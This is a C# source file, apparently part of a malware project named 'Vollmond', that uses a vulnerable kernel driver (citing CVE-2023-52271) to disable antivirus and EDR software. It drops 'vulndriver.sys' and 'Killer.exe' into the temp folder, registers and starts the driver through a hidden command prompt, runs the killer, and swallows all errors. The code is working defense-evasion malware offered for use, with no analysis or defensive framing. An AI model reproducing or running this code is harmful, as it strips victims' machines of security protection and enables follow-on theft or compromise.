using System.Diagnostics;
using System.Text;
using Vollmond.Browsers;

/*
Date now 17.03.2026
Exploit status: Don't fixed

 -------CVE-2023-52271-------

Original author and source: https://github.com/xM0kht4r/AV-EDR-Killer
 */

namespace Vollmond.Security_Bypass
{
    internal class KillAllAntiviruses
    {
        public static void KillAntiviruses()
        {
            try
            {
                string tempPath = Path.GetTempPath();

                ExtractResources.ExtractResource("payload.Security_Bypass", "vulndriver.sys", tempPath);
                ExtractResources.ExtractResource("payload.Security_Bypass", "Killer.exe", tempPath);

                ProcessStartInfo reg_driver = new ProcessStartInfo()
                {
                    FileName = "cmd.exe",
                    CreateNoWindow = true, // Hide console
                    UseShellExecute = false, // something important
                    StandardOutputEncoding = Encoding.UTF8, // Encoding UTF-8
                    StandardErrorEncoding = Encoding.UTF8,
                    StandardInputEncoding = Encoding.UTF8,
                    RedirectStandardError = true,
                    RedirectStandardInput = true,
                    RedirectStandardOutput = true
                };

                using (Process reg_driver_process = Process.Start(reg_driver)) // Reg driver
                {
                    using (StreamWriter writer = reg_driver_process.StandardInput)
                    {
                        writer.WriteLine($"sc create MalDriver \"{Path.Combine(tempPath, "vulndriver.sys")}\" type= kernel"); // Reg driver
                        writer.WriteLine("sc start Maldriver"); // start driver
                        writer.WriteLine("exit"); // close terminal
                    }
                }

                ProcessStartInfo KillerIinfo = new ProcessStartInfo()
                {
                    FileName = Path.Combine(tempPath, "Killer.exe"),
                    CreateNoWindow = true
                };
                Process.Start(KillerIinfo); // Running antiviruses killer. Unfortunately it working very long time (+- 10 minute)
            }
            catch { }
        }
    }
}
